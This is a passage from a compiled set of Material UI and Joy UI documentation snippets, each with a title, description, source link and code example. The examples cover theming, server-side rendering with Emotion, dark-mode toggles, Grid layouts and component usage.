https://github.com/mui/material-ui/blob/master/docs/data/material/customization/how-to-customize/how-to-customize.md#2025-04-22_snippet_0\n\nLANGUAGE: css\nCODE:\n```\n.Button {\n  color: black;\n}\n\n/* Increase the specificity */\n.Button:disabled {\n  color: white;\n}\n```\n\nLANGUAGE: jsx\nCODE:\n```\n<Button disabled className=\"Button\">\n```\n\n----------------------------------------\n\nTITLE: Avatar Component HTML Structure\nDESCRIPTION: The basic HTML structure of the Avatar component, showing how it renders as a root div that can contain SVG, image, or text content.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/avatar/avatar.md#2025-04-22_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<div class=\"MuiAvatar-root\">\n  <!-- Avatar contents -->\n</div>\n```\n\n----------------------------------------\n\nTITLE: Creating a Material UI Theme for Server and Client\nDESCRIPTION: Defines a shared theme instance that will be used on both server and client sides. Creates a theme with customized primary, secondary, and error color palettes.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/guides/server-rendering/server-rendering.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nimport { createTheme } from '@mui/material/styles';\nimport { red } from '@mui/material/colors';\n\n// Create a theme instance.\nconst theme = createTheme({\n  palette: {\n    primary: {\n      main: '#556cd6',\n    },\n    secondary: {\n      main: '#19857b',\n    },\n    error: {\n      main: red.A400,\n    },\n  },\n});\n\nexport default theme;\n```\n\n----------------------------------------\n\nTITLE: Configuring TypeScript Paths for MUI Styled Engine\nDESCRIPTION: TSConfig path configuration required to use styled-components with Material UI in TypeScript. This maps the styled engine to use the styled-components implementation.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-cra-styled-components-ts/README.md#2025-04-22_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n\"paths\": {\n  \"@mui/styled-engine\": [\"./node_modules/@mui/styled-engine-sc\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Typography Components\nDESCRIPTION: Shows how to use Typography components for consistent text hierarchy with different levels.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/getting-started/tutorial/tutorial.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\n<div>\n  <Typography level=\"h4\" component=\"h1\">\n    Welcome!\n  </Typography>\n  <Typography level=\"body-sm\">Sign in to continue.</Typography>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Implementing Client-Side Hydration for Material UI\nDESCRIPTION: Sets up the client-side part of the server-side rendering. Creates an Emotion cache and uses ReactDOM.hydrateRoot to attach to the server-rendered HTML, maintaining the same component structure that was used on the server.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/guides/server-rendering/server-rendering.md#2025-04-22_snippet_5\n\nLANGUAGE: jsx\nCODE:\n```\nimport * as React from 'react';\nimport * as ReactDOM from 'react-dom';\nimport CssBaseline from '@mui/material/CssBaseline';\nimport { ThemeProvider } from '@mui/material/styles';\nimport { CacheProvider } from '@emotion/react';\nimport App from './App';\nimport theme from './theme';\nimport createEmotionCache from './createEmotionCache';\n\nconst cache = createEmotionCache();\n\nfunction Main() {\n  return (\n    <CacheProvider value={cache}>\n      <ThemeProvider theme={theme}>\n        {/* CssBaseline kickstart an elegant, consistent, and simple baseline\n            to build upon. */}\n        <CssBaseline />\n        <App />\n      </ThemeProvider>\n    </CacheProvider>\n  );\n}\n\nReactDOM.hydrateRoot(document.querySelector('#root'), <Main />);\n```\n\n----------------------------------------\n\nTITLE: Accordion Props Migration - Component Code Changes\nDESCRIPTION: Shows migration from TransitionComponent/TransitionProps to slots/slotProps pattern for Accordion component.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_2\n\nLANGUAGE: diff\nCODE:\n```\n<Accordion\n-  TransitionComponent={CustomTransition}\n-  TransitionProps={{ unmountOnExit: true }}\n+  slots={{ transition: CustomTransition }}\n+  slotProps={{ transition: { unmountOnExit: true } }}\n/>\n```\n\n----------------------------------------\n\nTITLE: Synchronizing Color Mode Between Joy UI and Material UI\nDESCRIPTION: Implementation of a color mode toggle that synchronizes the theme mode between Joy UI and Material UI using their respective hooks and setMode functions.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/integrations/material-ui/material-ui.md#2025-04-22_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nimport { useColorScheme as useJoyColorScheme } from '@mui/joy/styles';\nimport { useColorScheme as useMaterialColorScheme } from '@mui/material/styles';\n\nconst ModeToggle = () => {\n  const { mode, setMode: setMaterialMode } = useMaterialColorScheme();\n  const { setMode: setJoyMode } = useJoyColorScheme();\n  const [mounted, setMounted] = React.useState(false);\n  React.useEffect(() => {\n    setMounted(true);\n  }, []);\n  if (!mounted) {\n    // prevent server-side rendering mismatch\n    // because `mode` is undefined on the server.\n    return null;\n  }\n  return (\n    <IconButton\n      onClick={() => {\n        setMaterialMode(mode === 'dark' ? 'light' : 'dark');\n        setJoyMode(mode === 'dark' ? 'light' : 'dark');\n      }}\n    >\n      {/** You can use `mode` from Joy UI or Material UI since they are synced **/}\n      {mode === 'dark' ? <DarkMode /> : <LightMode />}\n    </IconButton>\n  );\n};\n```\n\n----------------------------------------\n\nTITLE: Implementing Basic Breadcrumbs in React\nDESCRIPTION: Demonstrates the basic usage of the Breadcrumbs component in a React application. This snippet shows how to create a simple breadcrumb navigation.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/breadcrumbs/breadcrumbs.md#2025-04-22_snippet_0\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"BasicBreadcrumbs.js\"}\n```\n\n----------------------------------------\n\nTITLE: TypeScript Theme Augmentation for Material UI\nDESCRIPTION: Demonstrates how to extend Material UI theme types using TypeScript module augmentation to add custom variables.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/theming/theming.md#2025-04-22_snippet_1\n\nLANGUAGE: tsx\nCODE:\n```\ndeclare module '@mui/material/styles' {\n  interface Theme {\n    status: {\n      danger: string;\n    };\n  }\n  // allow configuration using `createTheme()`\n  interface ThemeOptions {\n    status?: {\n      danger?: string;\n    };\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Dark Mode Toggle\nDESCRIPTION: Creates a mode toggle component using useColorScheme hook for switching between light and dark themes.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/getting-started/tutorial/tutorial.md#2025-04-22_snippet_5\n\nLANGUAGE: jsx\nCODE:\n```\nfunction ModeToggle() {\n  const { mode, setMode } = useColorScheme();\n  const [mounted, setMounted] = React.useState(false);\n\n  // necessary for server-side rendering\n  // because mode is undefined on the server\n  React.useEffect(() => {\n    setMounted(true);\n  }, []);\n  if (!mounted) {\n    return null;\n  }\n\n  return (\n    <Select\n      value={mode}\n      onChange={(event, newMode) => {\n        setMode(newMode);\n      }}\n      sx={{ width: 'max-content' }}\n    >\n      <Option value=\"system\">System</Option>\n      <Option value=\"light\">Light</Option>\n      <Option value=\"dark\">Dark</Option>\n    </Select>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Importing usePagination Hook in React\nDESCRIPTION: This snippet demonstrates how to import the usePagination hook from Material-UI for advanced customization of pagination functionality.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/pagination/pagination.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport usePagination from '@mui/material/usePagination';\n```\n\n----------------------------------------\n\nTITLE: CSS Theme Variables Configuration\nDESCRIPTION: Example of enabling CSS variables generation from Material UI theme configuration.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/theming/theming.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\nconst theme = createTheme({\n  cssVariables: true,\n});\n\nfunction App() {\n  return <ThemeProvider theme={theme}>...</ThemeProvider>;\n}\n```\n\n----------------------------------------\n\nTITLE: Styled-Components RTL Configuration\nDESCRIPTION: Integration of RTL support in styled-components using StyleSheetManager and stylis-plugin-rtl.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/right-to-left/right-to-left.md#2025-04-22_snippet_5\n\nLANGUAGE: jsx\nCODE:\n```\nimport { StyleSheetManager } from 'styled-components';\nimport rtlPlugin from 'stylis-plugin-rtl';\n\nfunction Rtl(props) {\n  return (\n    <StyleSheetManager stylisPlugins={[rtlPlugin]}>\n      {props.children}\n    </StyleSheetManager>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Custom Color Manipulation with Style Utils\nDESCRIPTION: Example of using Material UI style utilities like alpha() and getContrastRatio() to define custom color tokens with opacity and contrast calculations.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/palette/palette.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\nimport { createTheme, alpha, getContrastRatio } from '@mui/material/styles';\n\nconst violetBase = '#7F00FF';\nconst violetMain = alpha(violetBase, 0.7);\n\nconst theme = createTheme({\n  palette: {\n    violet: {\n      main: violetMain,\n      light: alpha(violetBase, 0.5),\n      dark: alpha(violetBase, 0.9),\n      contrastText: getContrastRatio(violetMain, '#fff') > 4.5 ? '#fff' : '#111',\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Customizing Box Component with sx Prop\nDESCRIPTION: This snippet shows how to customize the Box component using the sx prop, which allows for theme-aware styling.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/box/box.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\n{\"demo\": \"BoxSx.js\", \"defaultCodeOpen\": true }\n```\n\n----------------------------------------\n\nTITLE: Defining a Dataset for RichTreeView - React JSX\nDESCRIPTION: This snippet demonstrates how to define a hierarchical data structure in JavaScript suitable for use with the RichTreeView component in MUI X. The example shows an array of nodes each identified by a unique 'id', a 'label', and an optional 'children' array for nesting. The required input structure enables the RichTreeView to recursively generate tree nodes based on this dataset. No external dependencies are needed other than React and the MUI X RichTreeView component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/mui-x-v7.md#2025-04-22_snippet_0\n\nLANGUAGE: JSX\nCODE:\n```\nconst myDataSet = [\n  {\n    id: 'node-1',\n    label: 'Node 1',\n    children: [\n      { id: 'node-1-1', label: 'Node 1.1' },\n      { id: 'node-1-2', label: 'Node 1.2' },\n    ],\n  },\n  {\n    id: 'node-2',\n    label: 'Node 2',\n  },\n];\n```\n\n----------------------------------------\n\nTITLE: Using theme.transitions.create() method in JavaScript\nDESCRIPTION: Example showing how to use the theme.transitions.create() helper to create transitions for multiple CSS properties. This helper ensures consistent transition behavior throughout your UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/transitions/transitions.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\ntheme.transitions.create(['background-color', 'transform']);\n```\n\n----------------------------------------\n\nTITLE: Importing Material Icons in React\nDESCRIPTION: Two options for importing Material Icons as React components. Option 1 imports individual icons, while Option 2 uses named imports.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/icons/icons.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\nimport AccessAlarmIcon from '@mui/icons-material/AccessAlarm';\nimport ThreeDRotation from '@mui/icons-material/ThreeDRotation';\n```\n\nLANGUAGE: jsx\nCODE:\n```\nimport { AccessAlarm, ThreeDRotation } from '@mui/icons-material';\n```\n\n----------------------------------------\n\nTITLE: Using Stabilized Grid v2 Component in JSX\nDESCRIPTION: This JSX snippet demonstrates the usage of the stabilized `Grid v2` component (`@mui/material/Grid2`) in Material UI v6. It shows how to define responsive grid item sizes using the consolidated `size` prop with breakpoint keys (xs, sm, lg). Grid v2 uses the CSS `gap` property for spacing.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/material-ui-v6-is-out.md#2025-04-22_snippet_9\n\nLANGUAGE: jsx\nCODE:\n```\nimport Grid from '@mui/material/Grid2';\n\n<Grid container>\n  <Grid size={{ xs: 6, sm: 4, lg: 3 }} />\n  <Grid size={{ xs: 6, sm: 4, lg: 3 }} />\n  <Grid size={{ xs: 6, sm: 4, lg: 3 }} />\n</Grid>;\n```\n\n----------------------------------------\n\nTITLE: Extending the SX Prop Functionality in Material-UI\nDESCRIPTION: Shows how to add new keys to be processed by the sx prop by extending the unstable_sxConfig option in the theme. This allows custom properties to be handled by the sx prop system.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/experimental-api/configure-the-sx-prop/configure-the-sx-prop.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nExtendTheSxProp.js\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel for Emotion Styled with MUI in JavaScript\nDESCRIPTION: Presents the necessary Babel configuration to map MUI's styled utilities to emotion's canonical imports for compatibility with @emotion/babel-plugin. Defines importMap for @mui/system, @mui/material, and @mui/material/styles, mapping their styled exports to emotion's styled function. Ensure this configuration is in babel.config.js and that @emotion/babel-plugin is listed (and ordered) appropriately in your plugins.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/styled/styled.md#2025-04-22_snippet_10\n\nLANGUAGE: js\nCODE:\n```\nmodule.exports = {\\n  ...\\n  plugins: [\\n    [\\n      \"@emotion\",\\n      {\\n        importMap: {\\n          \"@mui/system\": {\\n            styled: {\\n              canonicalImport: [\"@emotion/styled\", \"default\"],\\n              styledBaseImport: [\"@mui/system\", \"styled\"]\\n            }\\n          },\\n          \"@mui/material\": {\\n            styled: {\\n              canonicalImport: [\"@emotion/styled\", \"default\"],\\n              styledBaseImport: [\"@mui/material\", \"styled\"]\\n            }\\n          },\\n          \"@mui/material/styles\": {\\n            styled: {\\n              canonicalImport: [\"@emotion/styled\", \"default\"],\\n              styledBaseImport: [\"@mui/material/styles\", \"styled\"]\\n            }\\n          }\\n        }\\n      }\\n    ]\\n  ]\\n};\n```\n\n----------------------------------------\n\nTITLE: Extending Material UI Theme Type for Custom Properties in sx Prop Callback (TSX)\nDESCRIPTION: Illustrates using TypeScript module augmentation to extend the Material UI `Theme` interface defined in `@mui/system`. This allows custom properties added to the theme (like `status.warning`) to be safely accessed with type checking within an `sx` prop callback function.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/getting-started/the-sx-prop/the-sx-prop.md#2025-04-22_snippet_18\n\nLANGUAGE: tsx\nCODE:\n```\nimport * as React from 'react';\nimport Box from '@mui/material/Box';\nimport { createTheme, ThemeProvider } from '@mui/material/styles';\nimport { orange } from '@mui/material/colors';\n\ndeclare module '@mui/system' {\n  interface Theme {\n    status: {\n      warning: string;\n    };\n  }\n}\n\nconst theme = createTheme({\n  status: {\n    warning: orange[500],\n  },\n});\n\nexport default function App() {\n  return (\n    <ThemeProvider theme={theme}>\n      <Box\n        sx={(theme) => ({\n          bgcolor: theme.status.warning,\n        })}\n      >\n        Example\n      </Box>\n    </ThemeProvider>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Default Props for Joy UI Components in Theme\nDESCRIPTION: Demonstrates how to define default props for a component at the theme level. This approach affects all instances of the component throughout the application.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/themed-components/themed-components.md#2025-04-22_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nextendTheme({\n  components: {\n    JoyIconButton: {\n      defaultProps: {\n        variant: 'outlined',\n        color: 'neutral',\n      },\n    },\n  },\n});\n\n// This is the same as:\n// <IconButton variant=\"outlined\" color=\"neutral\">\n<IconButton>...</IconButton>;\n```\n\n----------------------------------------\n\nTITLE: Customizing Input Focus Ring with CSS Variables\nDESCRIPTION: Example of using CSS variables to control the appearance of the input's focus ring, including position, size, and color.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/input/input.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<Input sx={{ '&:focus-within::before': { boxShadow: '...your custom value' } }} />\n```\n\n----------------------------------------\n\nTITLE: Customizing the DataGrid Toolbar with the sx Prop - React JSX\nDESCRIPTION: This example illustrates another method for customizing the DataGrid toolbar by leveraging the sx prop. This approach utilizes the sx shorthand to apply custom theme-based spacing for padding within the GridToolbarContainer. Dependencies are the same as before (MUI X DataGrid and styling system), and the sx prop automatically adapts padding based on the active theme's spacing. This approach provides a modern and concise way to style components in a React application using MUI X.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/mui-x-v5.md#2025-04-22_snippet_2\n\nLANGUAGE: JSX\nCODE:\n```\nfunction MyCustomToolbar() {\n  // means \"padding: theme.spacing(5)\", NOT \"5px\"\n  return (\n    <GridToolbarContainer sx={{ p: 5 }}>My custom toolbar</GridToolbarContainer>\n  );\n}\n\nexport default function App() {\n  return (\n    <div style={{ height: 400, width: '100%' }}>\n      <DataGrid components={{ Toolbar: MyCustomToolbar }} />\n    </div>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Flash-Free Dark Mode with Next.js Pages Router\nDESCRIPTION: This code snippet demonstrates how to use the InitColorSchemeScript component from Joy UI to enable flash-free dark mode in a Next.js application using the Pages Router. It shows the placement of the component before the main script to apply the correct stylesheet before component rendering.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/main-features/dark-mode-optimization/dark-mode-optimization.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Document, { Html, Head, Main, NextScript } from 'next/document';\nimport InitColorSchemeScript from '@mui/joy/InitColorSchemeScript';\n\nexport default class MyDocument extends Document {\n  render() {\n    return (\n      <Html data-color-scheme=\"light\">\n        <Head>...</Head>\n        <body>\n          <InitColorSchemeScript />\n          <Main />\n          <NextScript />\n        </body>\n      </Html>\n    );\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating an Emotion Cache Configuration\nDESCRIPTION: Creates a shared Emotion cache configuration to be used by both the server and client sides. This ensures consistent styling between server-rendered and client-rendered components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/guides/server-rendering/server-rendering.md#2025-04-22_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nimport createCache from '@emotion/cache';\n\nexport default function createEmotionCache() {\n  return createCache({ key: 'css' });\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Non-Linear Scale Slider in React\nDESCRIPTION: Demonstrates how to create a slider with a non-linear scale using the 'scale' prop in Material-UI, representing values on a logarithmic scale.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/slider/slider.md#2025-04-22_snippet_17\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"NonLinearSlider.js\"}\n```\n\n----------------------------------------\n\nTITLE: Implementing a Nested Grid Layout\nDESCRIPTION: This snippet demonstrates how to create a nested grid layout. It shows that nested grid containers inherit columns and spacing from their parent container.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/grid/grid.md#2025-04-22_snippet_4\n\nLANGUAGE: JSX\nCODE:\n```\n<Grid container spacing={1}>\n  <Grid container item spacing={3}>\n    <Grid item size={4}>\n      <Item>4</Item>\n    </Grid>\n    <Grid item size={4}>\n      <Item>4</Item>\n    </Grid>\n    <Grid item size={4}>\n      <Item>4</Item>\n    </Grid>\n  </Grid>\n</Grid>\n```\n\n----------------------------------------\n\nTITLE: Implementing Server-Side Rendering with Express and Material UI\nDESCRIPTION: Full implementation of the Express middleware for server-side rendering. Creates an Emotion cache, renders the React app to a string, extracts critical CSS, and sends the complete HTML page to the client.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/guides/server-rendering/server-rendering.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\nimport express from 'express';\nimport * as React from 'react';\nimport * as ReactDOMServer from 'react-dom/server';\nimport CssBaseline from '@mui/material/CssBaseline';\nimport { ThemeProvider } from '@mui/material/styles';\nimport { CacheProvider } from '@emotion/react';\nimport createEmotionServer from '@emotion/server/create-instance';\nimport App from './App';\nimport theme from './theme';\nimport createEmotionCache from './createEmotionCache';\n\nfunction handleRender(req, res) {\n  const cache = createEmotionCache();\n  const { extractCriticalToChunks, constructStyleTagsFromChunks } =\n    createEmotionServer(cache);\n\n  // Render the component to a string.\n  const html = ReactDOMServer.renderToString(\n    <CacheProvider value={cache}>\n      <ThemeProvider theme={theme}>\n        {/* CssBaseline kickstart an elegant, consistent, and simple baseline\n            to build upon. */}\n        <CssBaseline />\n        <App />\n      </ThemeProvider>\n    </CacheProvider>,\n  );\n\n  // Grab the CSS from emotion\n  const emotionChunks = extractCriticalToChunks(html);\n  const emotionCss = constructStyleTagsFromChunks(emotionChunks);\n\n  // Send the rendered page back to the client.\n  res.send(renderFullPage(html, emotionCss));\n}\n\nconst app = express();\n\napp.use('/build', express.static('build'));\n\n// This is fired every time the server-side receives a request.\napp.use(handleRender);\n\nconst port = 3000;\napp.listen(port);\n```\n\n----------------------------------------\n\nTITLE: Rendering a Link in List Item Button (React/JSX)\nDESCRIPTION: Demonstrates how to render a link within a ListItemButton component using the 'component' and 'href' props. This allows for seamless integration with navigation in React applications.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/lists/lists.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\n<ListItemButton component=\"a\" href=\"#simple-list\">\n  <ListItemText primary=\"Spam\" />\n</ListItemButton>\n```\n\n----------------------------------------\n\nTITLE: Adding Prepend Option to Emotion Cache for Correct Style Injection\nDESCRIPTION: Example showing how to add the prepend option to Emotion's createCache to ensure proper CSS injection order when using a custom cache configuration.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-style-changes.md#2025-04-22_snippet_9\n\nLANGUAGE: diff\nCODE:\n```\n import * as React from 'react';\n import { CacheProvider } from '@emotion/react';\n import createCache from '@emotion/cache';\n\n const cache = createCache({\n   key: 'css',\n+  prepend: true,\n });\n\n export default function PlainCssPriority() {\n   return (\n     <CacheProvider value={cache}>\n       {/* Your component tree. Now you can override Material UI's styles. */}\n     </CacheProvider>\n   );\n }\n```\n\n----------------------------------------\n\nTITLE: Enabling CSS Cascade Layers in _document.tsx for Next.js Pages Router\nDESCRIPTION: Diff showing how to enable CSS cascade layers in the _document.tsx file for Material UI with Next.js Pages Router.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/nextjs/nextjs.md#2025-04-22_snippet_14\n\nLANGUAGE: diff\nCODE:\n```\n+import { createEmotionCache } from '@mui/material-nextjs/v15-pagesRouter';\n ...\n\n MyDocument.getInitialProps = async (ctx) => {\n   const finalProps = await documentGetInitialProps(ctx, {\n+    emotionCache: createEmotionCache({ enableCssLayer: true }),\n   });\n   return finalProps;\n };\n```\n\n----------------------------------------\n\nTITLE: Implementing Conditional Rendering with Skeleton in React JSX\nDESCRIPTION: This snippet demonstrates how to conditionally render either an image or a Skeleton component based on the availability of data. It shows the basic usage of the Skeleton component as a placeholder.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/skeleton/skeleton.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\n{\n  item ? (\n    <img\n      style={{\n        width: 210,\n        height: 118,\n      }}\n      alt={item.title}\n      src={item.src}\n    />\n  ) : (\n    <Skeleton variant=\"rectangular\" width={210} height={118} />\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Importing Basic Card Components in React\nDESCRIPTION: Basic import statements for the core Card components from Material-UI library. These components are essential for creating simple card layouts.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/cards/cards.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Card from '@mui/material/Card';\nimport CardContent from '@mui/material/CardContent';\n```\n\n----------------------------------------\n\nTITLE: Configuring Emotion Cache for CSS Injection Order\nDESCRIPTION: Setup for Emotion cache to ensure correct CSS injection order when using Emotion with Material UI and Tailwind CSS.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/interoperability/interoperability.md#2025-04-22_snippet_18\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport * as React from 'react';\nimport { CacheProvider } from '@emotion/react';\nimport createCache from '@emotion/cache';\n\nconst cache = createCache({\n  key: 'css',\n  prepend: true,\n});\n\nexport default function PlainCssPriority() {\n  return (\n    <CacheProvider value={cache}>\n      {/* Your component tree. Now you can override Material UI's styles. */}\n    </CacheProvider>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Customizing Divider Component with Text in React\nDESCRIPTION: This snippet shows how to customize the Divider component to wrap other elements like text, using the component prop and setting the appropriate ARIA role.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/dividers/dividers.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\n<Divider component=\"div\" role=\"presentation\">\n  <Typography>Text element</Typography>\n</Divider>\n```\n\n----------------------------------------\n\nTITLE: Implementing Mode Switcher Component\nDESCRIPTION: React component implementation for switching between light, dark, and system color modes using useColorScheme hook.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/css-theme-variables/configuration.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\nimport { useColorScheme } from '@mui/material/styles';\n\nfunction ModeSwitcher() {\n  const { mode, setMode } = useColorScheme();\n\n  if (!mode) {\n    return null;\n  }\n\n  return (\n    <select\n      value={mode}\n      onChange={(event) => {\n        setMode(event.target.value);\n      }}\n    >\n      <option value=\"system\">System</option>\n      <option value=\"light\">Light</option>\n      <option value=\"dark\">Dark</option>\n    </select>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Using Theme Variables in Styled Components\nDESCRIPTION: Shows how to use theme variables in styled components. This example creates a Button component with background and text colors from the theme variables.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/css-theme-variables/usage.md#2025-04-22_snippet_2\n\nLANGUAGE: js\nCODE:\n```\nconst Button = styled('button')(({ theme }) => ({\n  backgroundColor: theme.vars.palette.primary.main, // var(--mui-palette-primary-main)\n  color: theme.vars.palette.primary.contrastText, // var(--mui-palette-primary-contrastText)\n}));\n```\n\n----------------------------------------\n\nTITLE: Configuring Row and Column Spacing in Grid\nDESCRIPTION: This snippet demonstrates how to set different spacing for rows and columns in a Grid layout using the rowSpacing and columnSpacing props.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/grid/grid.md#2025-04-22_snippet_2\n\nLANGUAGE: JSX\nCODE:\n```\n<Grid container rowSpacing={1} columnSpacing={{ xs: 1, sm: 2, md: 3 }}>\n  <Grid size={6}>\n    <Item>1</Item>\n  </Grid>\n  <Grid size={6}>\n    <Item>2</Item>\n  </Grid>\n  <Grid size={6}>\n    <Item>3</Item>\n  </Grid>\n  <Grid size={6}>\n    <Item>4</Item>\n  </Grid>\n</Grid>\n```\n\n----------------------------------------\n\nTITLE: Detecting System Color Scheme Preference\nDESCRIPTION: Demonstrates how to detect user's system color scheme preference using useMediaQuery hook.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/dark-mode/dark-mode.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\nimport * as React from 'react';\nimport useMediaQuery from '@mui/material/useMediaQuery';\nimport { createTheme, ThemeProvider } from '@mui/material/styles';\nimport CssBaseline from '@mui/material/CssBaseline';\n\nfunction App() {\n  const prefersDarkMode = useMediaQuery('(prefers-color-scheme: dark)');\n  return <div>prefersDarkMode: {prefersDarkMode.toString()}</div>;\n}\n```\n\n----------------------------------------\n\nTITLE: Masonry Image List Implementation in Material-UI\nDESCRIPTION: Shows implementation of a masonry layout with dynamic container heights based on image aspect ratios.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/image-list/image-list.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\n{\"demo\": \"MasonryImageList.js\"}\n```\n\n----------------------------------------\n\nTITLE: Server-Side Media Query Implementation\nDESCRIPTION: Demonstrates server-side implementation of useMediaQuery using ua-parser-js and css-mediaquery for device detection.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/use-media-query/use-media-query.md#2025-04-22_snippet_2\n\nLANGUAGE: js\nCODE:\n```\nimport * as ReactDOMServer from 'react-dom/server';\nimport parser from 'ua-parser-js';\nimport mediaQuery from 'css-mediaquery';\nimport { createTheme, ThemeProvider } from '@mui/material/styles';\n\nfunction handleRender(req, res) {\n  const deviceType = parser(req.headers['user-agent']).device.type || 'desktop';\n  const ssrMatchMedia = (query) => ({\n    matches: mediaQuery.match(query, {\n      width: deviceType === 'mobile' ? '0px' : '1024px',\n    }),\n  });\n\n  const theme = createTheme({\n    components: {\n      MuiUseMediaQuery: {\n        defaultProps: {\n          ssrMatchMedia,\n        },\n      },\n    },\n  });\n\n  const html = ReactDOMServer.renderToString(\n    <ThemeProvider theme={theme}>\n      <App />\n    </ThemeProvider>,\n  );\n\n  // …\n}\n```\n\n----------------------------------------\n\nTITLE: Basic Select Implementation in React\nDESCRIPTION: Basic implementation of the Select component with Option elements for selecting between dog and cat values.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/select/select.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Select from '@mui/joy/Select';\nimport Option from '@mui/joy/Option';\n\nexport default function SelectBasic() {\n  return (\n    <Select defaultValue=\"dog\">\n      <Option value=\"dog\">Dog</Option>\n      <Option value=\"cat\">Cat</Option>\n    </Select>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Customizing the DataGrid Toolbar with Reduced CSS Specificity - React JSX\nDESCRIPTION: This snippet shows how to style the DataGrid toolbar in MUI X v5, where the reduced CSS specificity of built-in classes allows direct overrides. The custom GridToolbarContainerStyled no longer 